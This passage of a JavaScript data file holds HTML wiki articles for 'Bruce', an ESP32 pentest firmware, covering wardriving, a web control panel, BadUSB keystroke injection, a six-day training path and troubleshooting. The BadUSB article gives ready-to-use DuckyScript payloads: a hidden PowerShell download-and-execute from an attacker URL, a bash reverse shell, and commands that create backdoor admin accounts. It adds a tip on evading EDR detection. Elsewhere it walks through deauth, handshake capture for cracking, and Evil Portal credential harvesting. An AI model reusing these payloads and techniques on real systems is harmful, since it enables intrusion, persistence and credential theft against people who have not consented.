                            <tr><th>Device Type</th><th>Effect</th><th>Recovery</th></tr>
                            <tr><td>Wireless Mouse</td><td>Complete loss of control</td><td>Instant when stopped</td></tr>
                            <tr><td>Wireless Keyboard</td><td>Keystrokes lost/delayed</td><td>Instant</td></tr>
                            <tr><td>Zigbee Devices</td><td>Commands fail</td><td>May need re-pair</td></tr>
                            <tr><td>2.4GHz Drone</td><td>Failsafe triggered</td><td>Auto-land/RTH</td></tr>
                            <tr><td>Bluetooth</td><td>Degraded (hops away)</td><td>Automatic</td></tr>
                            <tr><td>WiFi 2.4GHz</td><td>Minimal (different modulation)</td><td>N/A</td></tr>
                        </table>

                        <div class="info-box">
                            <strong>Research Use:</strong> Test IoT device resilience, evaluate wireless keyboard security for corporate environments, drone counter-UAS research (in authorized facilities only).
                        </div>
                    </article>`
            }
        ],
        gps: [
            {
                id: 'wardriving', title: "Wardriving", type: "recon", tag: "Mapping",
                desc: "Log Wi-Fi networks with GPS coordinates for mapping and security assessment.",
                steps: ["Connect GPS Module", "Configure Logging", "Start Scan", "Drive/Walk Area", "Export to Wigle"],
                wiki: `
                    <article class="wiki-article">
                        <h2>Wardriving - Wi-Fi Geolocation Mapping</h2>
                        
                        <p>Wardriving is the practice of searching for Wi-Fi networks while moving through an area, logging their locations via GPS. Originally done from vehicles (hence "driving"), it's now common on foot, bike, or drone.</p>

                        <h3>System Architecture</h3>
                        <div class="diagram-box">
                            <pre>
<span class="diagram-label">WARDRIVING DATA FLOW</span>

  GPS Satellites              Bruce                    Output
       ‚îÇ                        ‚îÇ                        ‚îÇ
       ‚îÇ  <span class="diagram-arrow">‚îÄ‚îÄ NMEA Sentences ‚îÄ‚îÄ></span> ‚îÇ                        ‚îÇ
       ‚îÇ   (Lat/Long/Time)      ‚îÇ                        ‚îÇ
       ‚îÇ                        ‚îÇ                        ‚îÇ
  Wi-Fi APs                     ‚îÇ                        ‚îÇ
       ‚îÇ  <span class="diagram-arrow">‚îÄ‚îÄ Beacon Frames ‚îÄ‚îÄ‚îÄ></span> ‚îÇ                        ‚îÇ
       ‚îÇ   (SSID/BSSID/RSSI)    ‚îÇ                        ‚îÇ
       ‚îÇ                        ‚îÇ                        ‚îÇ
       ‚îÇ                        ‚ñº                        ‚îÇ
       ‚îÇ                  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê                   ‚îÇ
       ‚îÇ                  ‚îÇ <span class="diagram-data">Correlate</span> ‚îÇ                   ‚îÇ
       ‚îÇ                  ‚îÇ GPS + AP ‚îÇ                   ‚îÇ
       ‚îÇ                  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                   ‚îÇ
       ‚îÇ                       ‚îÇ                         ‚îÇ
       ‚îÇ                       ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ<span class="diagram-arrow">‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ></span>‚îÇ
       ‚îÇ                         CSV/KML Export          ‚îÇ
       ‚îÇ                                                 ‚ñº
       ‚îÇ                                          ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
       ‚îÇ                                          ‚îÇ <span class="diagram-data">Wigle.net</span>  ‚îÇ
       ‚îÇ                                          ‚îÇ <span class="diagram-data">Upload</span>     ‚îÇ
       ‚îÇ                                          ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                            </pre>
                        </div>

                        <h3>Hardware Setup</h3>
                        <div class="info-box">
                            <strong>Required:</strong> M5Stack GPS Unit (AT6558 + MAX2659) or compatible UART GPS module. Connect to Grove port or GPIO pins 1/2.
                        </div>

                        <div class="pin-diagram">
                            <div class="pin-item"><div class="pin-name">VCC</div><div class="pin-func">5V Power</div></div>
                            <div class="pin-item"><div class="pin-name">GND</div><div class="pin-func">Ground</div></div>
                            <div class="pin-item"><div class="pin-name">TX</div><div class="pin-func">GPIO 1 (RX)</div></div>
                            <div class="pin-item"><div class="pin-name">RX</div><div class="pin-func">GPIO 2 (TX)</div></div>
                        </div>

                        <h3>Step-by-Step Wardriving</h3>
                        <div class="step-flow">
                            <div class="step-item">
                                <div class="step-num">1</div>
                                <div class="step-content">
                                    <div class="step-title">Acquire GPS Lock</div>
                                    <div class="step-desc">Power on outdoors with clear sky view. Wait for GPS fix (1-3 minutes cold start). Screen shows satellite count and coordinates when locked.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">2</div>
                                <div class="step-content">
                                    <div class="step-title">Configure Scan Settings</div>
                                    <div class="step-desc">Set scan interval (default: 1 second). Enable/disable 5GHz scanning. Choose log format: Wigle CSV (recommended) or KML for Google Earth.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">3</div>
                                <div class="step-content">
                                    <div class="step-title">Start Logging</div>
                                    <div class="step-desc">Press START. Screen shows real-time stats: networks found, unique APs, current coordinates. New networks flash briefly when discovered.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">4</div>
                                <div class="step-content">
                                    <div class="step-title">Cover Target Area</div>
                                    <div class="step-desc">Walk or drive through the area. Move slowly for better accuracy. Each AP is logged once with strongest signal location. Typical yield: 50-200 APs per kilometer in urban areas.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">5</div>
                                <div class="step-content">
                                    <div class="step-title">Export & Upload</div>
                                    <div class="step-desc">Stop logging. File saved to <code>/SD/wardrive/[date].csv</code>. Upload to Wigle.net for global Wi-Fi map contribution and statistics.</div>
                                </div>
                            </div>
                        </div>

                        <h3>Wigle CSV Format</h3>
                        <div class="code-block">WigleWifi-1.4,appRelease=Bruce,model=Cardputer,release=1.0,device=ESP32,display=internal,board=M5Stack,brand=M5
MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type
AA:BB:CC:DD:EE:FF,HomeNetwork,WPA2,2024-01-15 14:30:00,6,-65,37.7749,-122.4194,10,5,WIFI
11:22:33:44:55:66,CoffeeShop_Guest,Open,2024-01-15 14:30:05,11,-72,37.7750,-122.4195,10,5,WIFI</div>

                        <h3>Data Collected Per Network</h3>
                        <div class="spec-grid">
                            <div class="spec-item"><div class="spec-label">BSSID</div><div class="spec-value">MAC Address</div></div>
                            <div class="spec-item"><div class="spec-label">SSID</div><div class="spec-value">Network Name</div></div>
                            <div class="spec-item"><div class="spec-label">Security</div><div class="spec-value">Open/WEP/WPA/WPA2/WPA3</div></div>
                            <div class="spec-item"><div class="spec-label">Channel</div><div class="spec-value">1-14 (2.4GHz)</div></div>
                            <div class="spec-item"><div class="spec-label">RSSI</div><div class="spec-value">Signal Strength (dBm)</div></div>
                            <div class="spec-item"><div class="spec-label">Coordinates</div><div class="spec-value">Lat/Long (WGS84)</div></div>
                            <div class="spec-item"><div class="spec-label">Timestamp</div><div class="spec-value">ISO 8601 Format</div></div>
                            <div class="spec-item"><div class="spec-label">Altitude</div><div class="spec-value">Meters (if available)</div></div>
                        </div>

                        <h3>Real-World Applications</h3>
                        <ul>
                            <li><strong>Security Assessment:</strong> Map corporate Wi-Fi coverage, identify rogue APs</li>
                            <li><strong>Site Survey:</strong> Plan new AP placement based on existing coverage</li>
                            <li><strong>Research:</strong> Study Wi-Fi density, security trends over time</li>
                            <li><strong>Geolocation:</strong> Build local Wi-Fi positioning database</li>
                            <li><strong>OSINT:</strong> Correlate network names with physical locations</li>
                        </ul>

                        <h3>Performance Metrics</h3>
                        <div class="metric-row">
                            <div class="metric-card">
                                <div class="metric-value">~100</div>
                                <div class="metric-label">APs/Minute (Urban)</div>
                            </div>
                            <div class="metric-card">
                                <div class="metric-value">2.5m</div>
                                <div class="metric-label">GPS Accuracy</div>
                            </div>
                            <div class="metric-card">
                                <div class="metric-value">8hr</div>
                                <div class="metric-label">Battery Life</div>
                            </div>
                        </div>

                        <div class="success-box">
                            <strong>Pro Tip:</strong> For best results, wardrive during business hours when more devices are active. Use an external antenna for the GPS module to improve fix time and accuracy.
                        </div>
                    </article>`
            }
        ],
        tools: [
            {
                id: 'webui', title: "Web Interface", type: "util", tag: "Remote",
                desc: "Full remote control via smartphone browser with file management and live monitoring.",
                steps: ["Enable Web UI", "Connect to Bruce AP", "Open Browser", "Navigate Interface", "Manage Files"],
                wiki: `
                    <article class="wiki-article">
                        <h2>Web Interface - Remote Control Center</h2>
                        
                        <p>The Web UI transforms any smartphone or laptop into a full control panel for Bruce. Access all features, download captured files, and monitor operations in real-time through a responsive web interface.</p>

                        <h3>Connection Architecture</h3>
                        <div class="diagram-box">
                            <pre>
<span class="diagram-label">WEB UI NETWORK TOPOLOGY</span>

  Your Phone/Laptop                Bruce (ESP32)
        ‚îÇ                               ‚îÇ
        ‚îÇ  <span class="diagram-arrow">‚îÄ‚îÄ Connect to WiFi ‚îÄ‚îÄ></span>       ‚îÇ
        ‚îÇ     SSID: "Bruce_AP"          ‚îÇ
        ‚îÇ     Pass: "bruce123"          ‚îÇ
        ‚îÇ                               ‚îÇ
        ‚îÇ  <span class="diagram-arrow"><‚îÄ‚îÄ DHCP: 192.168.4.x ‚îÄ‚îÄ</span>      ‚îÇ
        ‚îÇ                               ‚îÇ
        ‚îÇ                               ‚îÇ
        ‚ñº                               ‚ñº
  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê                   ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
  ‚îÇ <span class="diagram-data">Browser</span>  ‚îÇ <span class="diagram-arrow">‚îÄ‚îÄ HTTP GET ‚îÄ‚îÄ></span> ‚îÇ <span class="diagram-data">Web Server</span>   ‚îÇ
  ‚îÇ          ‚îÇ                   ‚îÇ Port 80      ‚îÇ
  ‚îÇ          ‚îÇ <span class="diagram-arrow"><‚îÄ‚îÄ HTML/JS ‚îÄ‚îÄ‚îÄ</span> ‚îÇ              ‚îÇ
  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                   ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
        ‚îÇ                               ‚îÇ
        ‚îÇ  <span class="diagram-arrow">‚îÄ‚îÄ WebSocket ‚îÄ‚îÄ></span>             ‚îÇ
        ‚îÇ     Real-time updates         ‚îÇ
        ‚îÇ  <span class="diagram-arrow"><‚îÄ‚îÄ Live Data ‚îÄ‚îÄ‚îÄ</span>             ‚îÇ
                            </pre>
                        </div>

                        <h3>Step-by-Step Setup</h3>
                        <div class="step-flow">
                            <div class="step-item">
                                <div class="step-num">1</div>
                                <div class="step-content">
                                    <div class="step-title">Enable Web UI</div>
                                    <div class="step-desc">Navigate to <strong>Config ‚Üí Web UI ‚Üí Enable</strong>. Bruce creates a Wi-Fi access point. Default SSID: "Bruce_AP", Password: "bruce123" (configurable).</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">2</div>
                                <div class="step-content">
                                    <div class="step-title">Connect Your Device</div>
                                    <div class="step-desc">On your phone/laptop, connect to the "Bruce_AP" network. Ignore "No Internet" warnings - this is expected for a local network.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">3</div>
                                <div class="step-content">
                                    <div class="step-title">Open Web Interface</div>
                                    <div class="step-desc">Open browser and navigate to <code>http://192.168.4.1</code>. The interface loads automatically. Bookmark for quick access.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">4</div>
                                <div class="step-content">
                                    <div class="step-title">Navigate & Control</div>
                                    <div class="step-desc">Use the web dashboard to access all Bruce features. Start/stop attacks, view logs, download files - all from your phone.</div>
                                </div>
                            </div>
                        </div>

                        <h3>Web UI Features</h3>
                        <table class="freq-table">
                            <tr><th>Feature</th><th>Description</th></tr>
                            <tr><td>Dashboard</td><td>System status, battery, memory usage</td></tr>
                            <tr><td>Wi-Fi Scanner</td><td>Live network list with signal graphs</td></tr>
                            <tr><td>Attack Control</td><td>Start/stop deauth, beacon spam, etc.</td></tr>
                            <tr><td>File Manager</td><td>Browse SD card, download/upload files</td></tr>
                            <tr><td>Handshake Viewer</td><td>List captured .pcap files, download directly</td></tr>
                            <tr><td>Credential Log</td><td>View Evil Portal captures in real-time</td></tr>
                            <tr><td>Settings</td><td>Configure all Bruce options</td></tr>
                            <tr><td>Terminal</td><td>Direct command input (advanced)</td></tr>
                        </table>

                        <h3>API Endpoints</h3>
                        <div class="code-block"># Available REST API endpoints
GET  /api/status        # System status JSON
GET  /api/scan          # Trigger Wi-Fi scan
GET  /api/networks      # List scanned networks
POST /api/deauth        # Start deauth attack
GET  /api/files         # List SD card files
GET  /api/download?f=   # Download specific file
POST /api/upload        # Upload file to SD
GET  /api/credentials   # Get captured creds</div>

                        <div class="info-box">
                            <strong>Pro Tip:</strong> Use the Web UI to download .pcap handshake files directly to your phone, then transfer to your cracking rig via cloud storage - no SD card removal needed.
                        </div>
                    </article>`
            },
            {
                id: 'badusb_script', title: "BadUSB", type: "attack", tag: "HID",
                desc: "USB HID injection using DuckyScript for automated keystroke attacks via USB cable.",
                steps: ["Create Payload Script", "Connect USB to Target", "Select Payload", "Execute Attack", "Verify Success"],
                wiki: `
                    <article class="wiki-article">
                        <h2>BadUSB - USB HID Injection</h2>
                        
                        <p>The ESP32-S3 has native USB OTG support, allowing Bruce to emulate a USB keyboard and mouse. When connected to a target computer, it can type commands at superhuman speed - up to 1000 characters per second.</p>

                        <h3>Attack Flow</h3>
                        <div class="attack-chain">
                            <span class="chain-node">Connect USB</span>
                            <span class="chain-arrow">‚Üí</span>
                            <span class="chain-node">OS Detects "Keyboard"</span>
                            <span class="chain-arrow">‚Üí</span>
                            <span class="chain-node">Auto-Trust (No Prompt)</span>
                            <span class="chain-arrow">‚Üí</span>
                            <span class="chain-node active">Payload Executes</span>
                        </div>

                        <h3>Step-by-Step Execution</h3>
                        <div class="step-flow">
                            <div class="step-item">
                                <div class="step-num">1</div>
                                <div class="step-content">
                                    <div class="step-title">Create DuckyScript Payload</div>
                                    <div class="step-desc">Write your payload using DuckyScript syntax. Save to <code>/SD/badusb/[name].txt</code>. Test on a VM first to verify behavior.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">2</div>
                                <div class="step-content">
                                    <div class="step-title">Select Payload on Bruce</div>
                                    <div class="step-desc">Navigate to <strong>Tools ‚Üí BadUSB</strong>. Browse and select your payload file. Preview shows first few lines for verification.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">3</div>
                                <div class="step-content">
                                    <div class="step-title">Connect to Target</div>
                                    <div class="step-desc">Plug Bruce into target computer's USB port. Wait 2-3 seconds for driver installation. Most OSes auto-trust HID devices with no prompt.</div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">4</div>
                                <div class="step-content">
                                    <div class="step-title">Execute Payload</div>
                                    <div class="step-desc">Press ENTER on Bruce to start. Keystrokes are injected immediately. Screen shows progress and any errors encountered.</div>
                                </div>
                            </div>
                        </div>

                        <h3>Payload Examples by OS</h3>
                        <div class="code-block">REM === Windows: Download & Execute ===
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass -c "IEX(IWR 'http://attacker/payload.ps1')"
ENTER</div>

                        <div class="code-block">REM === Windows: Add Admin User ===
DELAY 1000
GUI r
DELAY 300
STRING cmd
CTRL SHIFT ENTER
DELAY 1000
ALT y
DELAY 500
STRING net user hacker P@ssw0rd123 /add
ENTER
DELAY 200
STRING net localgroup administrators hacker /add
ENTER</div>

                        <div class="code-block">REM === macOS: Reverse Shell ===
DELAY 1000
GUI SPACE
DELAY 500
STRING terminal
ENTER
DELAY 1000
STRING bash -i >& /dev/tcp/attacker/4444 0>&1
ENTER</div>

                        <div class="code-block">REM === Linux: Backdoor User ===
DELAY 1000
ALT F2
DELAY 500
STRING gnome-terminal
ENTER
DELAY 1000
STRING sudo useradd -m -s /bin/bash -G sudo backdoor
ENTER
DELAY 500
STRING echo 'backdoor:password' | sudo chpasswd
ENTER</div>

                        <h3>DuckyScript Quick Reference</h3>
                        <table class="freq-table">
                            <tr><th>Command</th><th>Windows</th><th>macOS</th><th>Linux</th></tr>
                            <tr><td>GUI r</td><td>Run dialog</td><td>-</td><td>-</td></tr>
                            <tr><td>GUI SPACE</td><td>-</td><td>Spotlight</td><td>-</td></tr>
                            <tr><td>ALT F2</td><td>-</td><td>-</td><td>Run dialog</td></tr>
                            <tr><td>CTRL ALT t</td><td>-</td><td>-</td><td>Terminal</td></tr>
                            <tr><td>CTRL SHIFT ENTER</td><td>Run as Admin</td><td>-</td><td>-</td></tr>
                        </table>

                        <h3>Specifications</h3>
                        <div class="spec-grid">
                            <div class="spec-item"><div class="spec-label">USB Standard</div><div class="spec-value">USB 2.0 OTG</div></div>
                            <div class="spec-item"><div class="spec-label">HID Class</div><div class="spec-value">Keyboard + Mouse</div></div>
                            <div class="spec-item"><div class="spec-label">Type Speed</div><div class="spec-value">~1000 char/s</div></div>
                            <div class="spec-item"><div class="spec-label">Detection Time</div><div class="spec-value">2-3 seconds</div></div>
                        </div>

                        <div class="warning-box">
                            <strong>Evasion Note:</strong> Modern EDR solutions may flag rapid keystroke injection. Add realistic DELAY commands (100-300ms) between keystrokes to appear more human-like and evade behavioral detection.
                        </div>
                    </article>`
            }
        ],
        help: [
            {
                id: 'learn_path', title: "Learning Path", type: "util", tag: "Guide",
                desc: "Structured 6-day curriculum from beginner to advanced Bruce operations.",
                steps: ["Follow Daily Modules", "Complete Exercises", "Build Skills Progressively"],
                wiki: `
                    <article class="wiki-article">
                        <h2>Bruce Mastery - 6-Day Learning Path</h2>
                        
                        <p>This structured curriculum takes you from unboxing to advanced operations. Each day builds on previous skills. Allocate 2-3 hours per day for optimal learning.</p>

                        <h3>Day 1: Setup & Orientation</h3>
                        <div class="timeline">
                            <div class="timeline-item">
                                <div class="timeline-time">Hour 1</div>
                                <div class="timeline-text"><strong>Hardware Setup:</strong> Insert microSD card (FAT32 formatted). Connect USB-C for charging. Familiarize with button layout and screen.</div>
                            </div>
                            <div class="timeline-item">
                                <div class="timeline-time">Hour 2</div>
                                <div class="timeline-text"><strong>Navigation:</strong> Learn menu system. Practice using keyboard for navigation. Explore all top-level menus without executing anything.</div>
                            </div>
                            <div class="timeline-item">
                                <div class="timeline-time">Hour 3</div>
                                <div class="timeline-text"><strong>Web UI Setup:</strong> Enable Web UI, connect phone, bookmark interface. Practice file browsing and settings changes.</div>
                            </div>
                        </div>
                        <div class="success-box"><strong>Day 1 Goal:</strong> Comfortable with device navigation and Web UI access.</div>

                        <h3>Day 2: Wi-Fi Reconnaissance</h3>
                        <div class="timeline">
                            <div class="timeline-item">
                                <div class="timeline-time">Hour 1</div>
                                <div class="timeline-text"><strong>Passive Scanning:</strong> Perform Wi-Fi scan on your home network. Identify your AP, note channel, RSSI, encryption type.</div>
                            </div>
                            <div class="timeline-item">
                                <div class="timeline-time">Hour 2</div>
                                <div class="timeline-text"><strong>Client Detection:</strong> Enable station scanning. Identify devices connected to your network. Understand BSSID vs client MAC.</div>
                            </div>
                            <div class="timeline-item">
                                <div class="timeline-time">Hour 3</div>
                                <div class="timeline-text"><strong>Deauth Practice:</strong> On YOUR network only, perform deauth attack. Capture handshake. Verify .pcap file on SD card.</div>
                            </div>
                        </div>
                        <div class="success-box"><strong>Day 2 Goal:</strong> Successfully capture a WPA2 handshake from your own network.</div>

                        <h3>Day 3: Social Engineering Tools</h3>
                        <div class="timeline">
                            <div class="timeline-item">
                                <div class="timeline-time">Hour 1</div>
                                <div class="timeline-text"><strong>Beacon Spam:</strong> Test beacon spam with funny SSIDs. Observe effect on your phone's Wi-Fi list. Try custom SSID list.</div>
                            </div>
                            <div class="timeline-item">
                                <div class="timeline-time">Hour 2</div>
                                <div class="timeline-text"><strong>Evil Portal Setup:</strong> Create custom portal HTML. Deploy on Bruce. Connect test device and verify capture flow.</div>
                            </div>
                            <div class="timeline-item">
                                <div class="timeline-time">Hour 3</div>
                                <div class="timeline-text"><strong>Credential Review:</strong> Examine captured credentials. Understand log format. Practice exporting via Web UI.</div>
                            </div>
                        </div>
                        <div class="success-box"><strong>Day 3 Goal:</strong> Deploy working Evil Portal and capture test credentials.</div>

                        <h3>Day 4: HID Attacks</h3>
                        <div class="timeline">
                            <div class="timeline-item">
                                <div class="timeline-time">Hour 1</div>
                                <div class="timeline-text"><strong>DuckyScript Basics:</strong> Write simple payload (open notepad, type message). Test on VM. Understand timing with DELAY.</div>
                            </div>
                            <div class="timeline-item">
                                <div class="timeline-time">Hour 2</div>
                                <div class="timeline-text"><strong>BadUSB Execution:</strong> Load payload on Bruce. Connect to test VM. Execute and verify. Debug any issues.</div>
                            </div>
                            <div class="timeline-item">
                                <div class="timeline-time">Hour 3</div>
                                <div class="timeline-text"><strong>BadBLE Practice:</strong> Configure Bluetooth HID. Pair with test device. Execute wireless payload. Compare to USB method.</div>
                            </div>
                        </div>
                        <div class="success-box"><strong>Day 4 Goal:</strong> Execute HID payloads via both USB and Bluetooth.</div>

                        <h3>Day 5: Infrared & RF</h3>
                        <div class="timeline">
                            <div class="timeline-item">
                                <div class="timeline-time">Hour 1</div>
                                <div class="timeline-text"><strong>IR Recording:</strong> Capture signals from TV remote, AC remote, etc. Save and organize in folders. Test replay.</div>
                            </div>
                            <div class="timeline-item">
                                <div class="timeline-time">Hour 2</div>
                                <div class="timeline-text"><strong>TV-B-Gone:</strong> Test on your own TV. Note which manufacturer code works. Understand IR range limitations.</div>
                            </div>
                            <div class="timeline-item">
                                <div class="timeline-time">Hour 3</div>
                                <div class="timeline-text"><strong>Sub-GHz (if hardware available):</strong> Connect CC1101. Scan 433MHz. Capture weather station or doorbell signal.</div>
                            </div>
                        </div>
                        <div class="success-box"><strong>Day 5 Goal:</strong> Build personal IR remote library. Understand RF basics.</div>

                        <h3>Day 6: Advanced Operations</h3>
                        <div class="timeline">
                            <div class="timeline-item">
                                <div class="timeline-time">Hour 1</div>
                                <div class="timeline-text"><strong>Wardriving:</strong> Connect GPS module. Configure logging. Walk neighborhood and collect data. Export to Wigle format.</div>
                            </div>
                            <div class="timeline-item">
                                <div class="timeline-time">Hour 2</div>
                                <div class="timeline-text"><strong>Automation:</strong> Create multi-step attack chains. Combine recon ‚Üí attack ‚Üí exfil workflows.</div>
                            </div>
                            <div class="timeline-item">
                                <div class="timeline-time">Hour 3</div>
                                <div class="timeline-text"><strong>Documentation:</strong> Organize all captured data. Create personal playbook. Document successful techniques.</div>
                            </div>
                        </div>
                        <div class="success-box"><strong>Day 6 Goal:</strong> Complete end-to-end assessment workflow. Graduate to independent operations.</div>

                        <h3>Skill Progression Matrix</h3>
                        <table class="freq-table">
                            <tr><th>Skill</th><th>Beginner</th><th>Intermediate</th><th>Advanced</th></tr>
                            <tr><td>Wi-Fi</td><td>Scan networks</td><td>Capture handshakes</td><td>Crack + Evil Portal chains</td></tr>
                            <tr><td>HID</td><td>Simple payloads</td><td>OS-specific scripts</td><td>Evasion techniques</td></tr>
                            <tr><td>IR/RF</td><td>Record/replay</td><td>Protocol analysis</td><td>Custom signal crafting</td></tr>
                            <tr><td>Recon</td><td>Basic scanning</td><td>Wardriving</td><td>Automated mapping</td></tr>
                        </table>
                    </article>`
            },
            {
                id: 'troubleshoot', title: "Troubleshooting", type: "util", tag: "Debug",
                desc: "Comprehensive solutions for common issues, error codes, and hardware problems.",
                steps: ["Identify Symptom", "Check Common Causes", "Apply Solution", "Verify Fix"],
                wiki: `
                    <article class="wiki-article">
                        <h2>Troubleshooting Guide</h2>
                        
                        <p>This guide covers the most common issues encountered with Bruce. Solutions are organized by symptom for quick diagnosis.</p>

                        <h3>SD Card Issues</h3>
                        <div class="step-flow">
                            <div class="step-item">
                                <div class="step-num">!</div>
                                <div class="step-content">
                                    <div class="step-title">SD Card Not Detected</div>
                                    <div class="step-desc">
                                        <strong>Causes:</strong> Wrong format, card too large, poor contact<br>
                                        <strong>Solutions:</strong><br>
                                        ‚Ä¢ Format as FAT32 (not exFAT) - use SD Card Formatter tool<br>
                                        ‚Ä¢ Cards >32GB need special formatting (use guiformat.exe on Windows)<br>
                                        ‚Ä¢ Clean contacts with isopropyl alcohol<br>
                                        ‚Ä¢ Try different SD card brand (SanDisk recommended)
                                    </div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">!</div>
                                <div class="step-content">
                                    <div class="step-title">Files Not Found</div>
                                    <div class="step-desc">
                                        <strong>Causes:</strong> Wrong directory structure, hidden files<br>
                                        <strong>Solutions:</strong><br>
                                        ‚Ä¢ Verify folder names: /portals/, /payloads/, /ir/, /subghz/<br>
                                        ‚Ä¢ Check for hidden ._ files (macOS creates these) - delete them<br>
                                        ‚Ä¢ File names must not contain special characters
                                    </div>
                                </div>
                            </div>
                        </div>

                        <h3>Wi-Fi Attack Issues</h3>
                        <div class="step-flow">
                            <div class="step-item">
                                <div class="step-num">!</div>
                                <div class="step-content">
                                    <div class="step-title">Deauth Not Working</div>
                                    <div class="step-desc">
                                        <strong>Causes:</strong> MFP enabled, 5GHz network, out of range<br>
                                        <strong>Solutions:</strong><br>
                                        ‚Ä¢ Check if target uses 802.11w (MFP) - these are immune<br>
                                        ‚Ä¢ Ensure target is on 2.4GHz (Bruce doesn't support 5GHz deauth)<br>
                                        ‚Ä¢ Move closer - RSSI should be >-70dBm<br>
                                        ‚Ä¢ Try Broadcast mode instead of Station mode<br>
                                        ‚Ä¢ Verify client is actually connected (not just cached)
                                    </div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">!</div>
                                <div class="step-content">
                                    <div class="step-title">No Handshake Captured</div>
                                    <div class="step-desc">
                                        <strong>Causes:</strong> Client not reconnecting, PMKID only, timing<br>
                                        <strong>Solutions:</strong><br>
                                        ‚Ä¢ Ensure active client exists (check station list first)<br>
                                        ‚Ä¢ Some devices cache credentials - wait longer or target different client<br>
                                        ‚Ä¢ Try capturing PMKID instead (doesn't require client)<br>
                                        ‚Ä¢ Verify SD card has space for .pcap file
                                    </div>
                                </div>
                            </div>
                        </div>

                        <h3>Hardware Issues</h3>
                        <div class="step-flow">
                            <div class="step-item">
                                <div class="step-num">!</div>
                                <div class="step-content">
                                    <div class="step-title">Device Freezes/Crashes</div>
                                    <div class="step-desc">
                                        <strong>Causes:</strong> Low battery, memory overflow, firmware bug<br>
                                        <strong>Solutions:</strong><br>
                                        ‚Ä¢ Press reset button (side of device) to reboot<br>
                                        ‚Ä¢ Charge battery fully before intensive operations<br>
                                        ‚Ä¢ Clear SD card logs if storage is full<br>
                                        ‚Ä¢ Update to latest firmware version
                                    </div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">!</div>
                                <div class="step-content">
                                    <div class="step-title">Screen Issues</div>
                                    <div class="step-desc">
                                        <strong>Causes:</strong> Brightness setting, display driver, hardware fault<br>
                                        <strong>Solutions:</strong><br>
                                        ‚Ä¢ Adjust brightness in Config ‚Üí Display<br>
                                        ‚Ä¢ Reset to defaults if display corrupted<br>
                                        ‚Ä¢ Check ribbon cable connection (advanced users only)
                                    </div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">!</div>
                                <div class="step-content">
                                    <div class="step-title">External Module Not Detected</div>
                                    <div class="step-desc">
                                        <strong>Causes:</strong> Wrong wiring, voltage mismatch, dead module<br>
                                        <strong>Solutions:</strong><br>
                                        ‚Ä¢ Verify wiring matches pinout diagrams exactly<br>
                                        ‚Ä¢ CC1101/NRF24 require 3.3V (5V will damage them)<br>
                                        ‚Ä¢ GPS modules typically need 5V<br>
                                        ‚Ä¢ Test module with multimeter for continuity<br>
                                        ‚Ä¢ Try different GPIO pins if configurable
                                    </div>
                                </div>
                            </div>
                        </div>

                        <h3>Connectivity Issues</h3>
                        <div class="step-flow">
                            <div class="step-item">
                                <div class="step-num">!</div>
                                <div class="step-content">
                                    <div class="step-title">Web UI Won't Load</div>
                                    <div class="step-desc">
                                        <strong>Causes:</strong> Wrong IP, not connected, browser cache<br>
                                        <strong>Solutions:</strong><br>
                                        ‚Ä¢ Verify connected to Bruce_AP network<br>
                                        ‚Ä¢ Use exactly: http://192.168.4.1 (not https)<br>
                                        ‚Ä¢ Clear browser cache or use incognito mode<br>
                                        ‚Ä¢ Disable mobile data on phone (forces Wi-Fi routing)
                                    </div>
                                </div>
                            </div>
                            <div class="step-item">
                                <div class="step-num">!</div>
                                <div class="step-content">
                                    <div class="step-title">BadUSB Not Recognized</div>
                                    <div class="step-desc">
                                        <strong>Causes:</strong> USB mode not enabled, driver issue, cable<br>
                                        <strong>Solutions:</strong><br>
                                        ‚Ä¢ Enable USB HID mode before connecting<br>
                                        ‚Ä¢ Try different USB port (USB 2.0 preferred)<br>
                                        ‚Ä¢ Use data cable, not charge-only cable<br>
                                        ‚Ä¢ On macOS: Check Security & Privacy for blocked devices
                                    </div>
                                </div>
                            </div>
                        </div>

                        <h3>Error Code Reference</h3>
                        <table class="freq-table">
                            <tr><th>Code</th><th>Meaning</th><th>Solution</th></tr>
